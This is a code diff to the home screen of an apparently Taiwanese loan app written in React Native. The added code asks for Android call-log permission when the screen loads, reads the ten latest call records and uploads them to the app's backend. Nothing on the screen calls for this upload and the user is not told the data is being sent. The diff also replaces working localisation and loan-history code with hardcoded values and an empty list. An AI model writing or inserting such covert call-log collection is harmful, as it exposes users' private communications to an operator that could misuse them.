@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useEffect, useState } from "react";
 import {
   Alert,
   Image,
@@ -9,11 +9,19 @@ import {
   View,
   StyleSheet,
   Linking,
-} from "react-native";
+  PermissionsAndroid,
+  Platform,
+ } from "react-native";
 import { useNavigation, useRoute, NavigationProp } from "@react-navigation/native";
 import { SafeAreaView } from "react-native-safe-area-context";
 import strings from "../../Languages";
-import { formatCurrency, formatString } from "../../utils/i18nHelper";
+import LoadingModal from "../../components/LoadingModal";
+import CallLogs from 'react-native-call-log';
+import { errorToast } from "../api/customToast";
+import { CalllogApi } from "../api/apiRequest";
+import StatusBarComponent from "../../components/StatusBarComponent";
+import AsyncStorage from "@react-native-async-storage/async-storage";
+import DeviceInfoScreen from "../../components/DeviceInfo";
 
 const Navbar = require('../../components/Navbar').default;
 const HamburgerMenu = require('../../components/HamburgerMenu').default;
@@ -23,68 +31,12 @@ export default function HomeScreen() {
   const route = useRoute();
   const [showHamburgerMenu, setShowHamburgerMenu] = useState(false);
 
-  // 添加這些 state
-  const [loanLimit, setLoanLimit] = useState(10000);
-  const [loanProgress, setLoanProgress] = useState(75);
-  const repaidAmount = loanLimit * (loanProgress / 100);
-  const remainingAmount = loanLimit - repaidAmount;
-  const userName = route.params?.userName || 'Steve';
-
-  // 這些資料應該來自 API 或 state
-  const loanHistoryData = [
-    { type: 'received', amount: 30000, date: '2024-01-01' },
-    { type: 'disbursed', amount: 30000, date: '2024-01-02' },
-    { type: 'approved', amount: 30000, date: '2024-01-03' },
-    { type: 'received', amount: 25000, date: '2024-01-04' },
-    { type: 'declined', amount: 0, date: '2024-01-05' },
-  ];
-
-  // 將資料轉換成顯示格式
-  const getLoanHistoryItems = () => {
-    return loanHistoryData.map(item => {
-      switch (item.type) {
-        case 'received':
-          return {
-            img: 'loan-received',
-            title: strings.LoanReceived,
-            desc: formatString(strings.LoanReceivedDesc, { 
-              amount: formatCurrency(item.amount) 
-            }),
-          };
-        case 'disbursed':
-          return {
-            img: 'loan-disbursed',
-            title: strings.LoanDisbursed,
-            desc: formatString(strings.LoanDisbursedDesc, { 
-              amount: formatCurrency(item.amount) 
-            }),
-          };
-        case 'approved':
-          return {
-            img: 'loan-approved',
-            title: strings.LoanApproved,
-            desc: formatString(strings.LoanApprovedDesc, { 
-              amount: formatCurrency(item.amount) 
-            }),
-          };
-        case 'declined':
-          return {
-            img: 'loan-declined',
-            title: strings.LoanDeclined,
-            desc: strings.LoanDeclinedDesc,
-          };
-        default:
-          return null;
-      }
-    }).filter(item => item !== null);
-  };
-
-  const handleCallPress = async (number: string) => {
+  const handleCallPress = async (number) => {
     const url = `tel:${number}`; // iOS/Android dono ke liye kaam karta hai
     try {
       const supported = await Linking.canOpenURL(url);
       if (!supported) {
-        Alert.alert('Error', 'Phone dialer is not available on this device');
+       navigation.navigate("CallLogsScreen")
         return;
       }
       await Linking.openURL(url);
@@ -93,13 +45,63 @@ export default function HomeScreen() {
       Alert.alert('Error', 'Could not open phone dialer');
     }
   };
+const [logs, setLogs] = useState([]);
+  const [loading, setLoading] = useState(true);
+
+  useEffect(() => {
+    getCallLogs();
+  }, []);
+
+  const getCallLogs = async () => {
+    if (Platform.OS !== 'android') {
+      alert('📱 Call logs not available on iOS');
+      return;
+    }
+    try {
+      const granted = await PermissionsAndroid.request(
+        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
+        {
+          title: 'Call Log Permission',
+          message: 'App needs access to your call logs',
+          buttonPositive: 'OK',
+        },
+      );
+      if (granted === PermissionsAndroid.RESULTS.GRANTED) {
+        const result = await CallLogs.load(10);  
+         calllogFuncation(result)
+        setLogs(result);
+      } else {
+        alert('Permission denied');
+      }
+    } catch (e) {
+      console.log('Error fetching logs', e);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  const calllogFuncation = async (log:any) => {
+   try {
+     setLoading(true);
+     const response = await CalllogApi(log, setLoading);
+  } catch (error) {
+     errorToast('Something went wrong. Please try again.');
+  } finally {
+     setLoading(false);
+  }
+};
 
 
   return (
     <SafeAreaView style={styles.container}>
+      <StatusBarComponent/>
+                          <LoadingModal visible={loading}/>
+  <DeviceInfoScreen/>  
       <ScrollView style={styles.scroll} 
 	  showsVerticalScrollIndicator={false}
 	  >
+                          {/* <LoadingModal visible={true}/> */}
+
         {/* Top Header */}
         <View style={styles.header}>
           {/* Hamburger Menu */}
@@ -152,18 +154,14 @@ export default function HomeScreen() {
               source={require('../../assets/images/home/greeting-avatar.png')}
               style={styles.avatar}
             />
-            <Text style={styles.greetingText}>
-              {formatString(strings.Greeting, { name: userName })}
-            </Text>
+            <Text style={styles.greetingText}>Hi Steve!</Text>
           </View>
-          <Text style={styles.loanText}>{strings.YourLoanLimit}</Text>
-          <Text style={styles.loanAmount}>
-            {formatCurrency(loanLimit)}
-          </Text>
+          <Text style={styles.loanText}>您的可貸額度為</Text>
+          <Text style={styles.loanAmount}>NT $ 10,000</Text>
 
           {/* Progress Bar */}
           <View style={styles.progressBg}>
-            <View style={[styles.progressFill, { width: `${loanProgress}%` }]} />
+            <View style={[styles.progressFill, { width: '75%' }]} />
           </View>
 
           <View style={styles.borrowMoreContainer}>
@@ -172,7 +170,7 @@ export default function HomeScreen() {
               onPress={() => navigation.navigate('ApplyLoanScreen')}
               // onPress={() => navigation.navigate('ApplyLoan')}
             >
-              <Text style={styles.borrowMoreText}>{strings.wantTo}</Text>
+              <Text style={styles.borrowMoreText}>{strings.home} Want To Borrow More?</Text>
               {/* <Text style={styles.borrowMoreText}>想要借更多嗎?</Text> */}
             </TouchableOpacity>
           </View>
@@ -188,9 +186,7 @@ export default function HomeScreen() {
             <View style={styles.repaidTextContainer}>
               <Text style={styles.repaidTitle}>{strings?.RepaidAmount}</Text>
               {/* <Text style={styles.repaidTitle}>已還款金額</Text> */}
-              <Text style={styles.repaidSubtitle}>
-                {formatCurrency(repaidAmount)}
-              </Text>
+              <Text style={styles.repaidSubtitle}>{strings?.LoremIpsum}</Text>
             </View>
           </View>
           <ImageBackground
@@ -198,7 +194,7 @@ export default function HomeScreen() {
             style={styles.repaidRight}
             resizeMode="stretch"
           >
-            <Text style={styles.repaidPercentage}>{loanProgress}%</Text>
+            <Text style={styles.repaidPercentage}>75%</Text>
           </ImageBackground>
         </View>
 
@@ -212,9 +208,18 @@ export default function HomeScreen() {
               style={styles.loanHistoryIcon}
             />
           </View>
+{/* 
+           {[
+            { img: 'loan-received', title: '貸款已入帳', desc: 'Loan of N30,000 was received' },
+            { img: 'loan-disbursed', title: '貸款已撥款', desc: 'N30,000 was disbursed to your bank' },
+            { img: 'loan-approved', title: '貸款已核准', desc: 'N30,000 was approved' },
+            { img: 'loan-received', title: '貸款已入帳', desc: 'Loan of N30,000 was received' },
+            { img: 'loan-declined', title: '貸款已拒絕', desc: 'We’re sorry! your loan was declined' },
+          ].map((item, index) => ( */}
 
-          {/* Loan History Items */}
-          {getLoanHistoryItems().map((item, index) => (
+           {[
+            
+          ].map((item, index) => (
             <View key={index} style={styles.historyItem}>
               <View style={styles.historyItemLeft}>
                 <Image
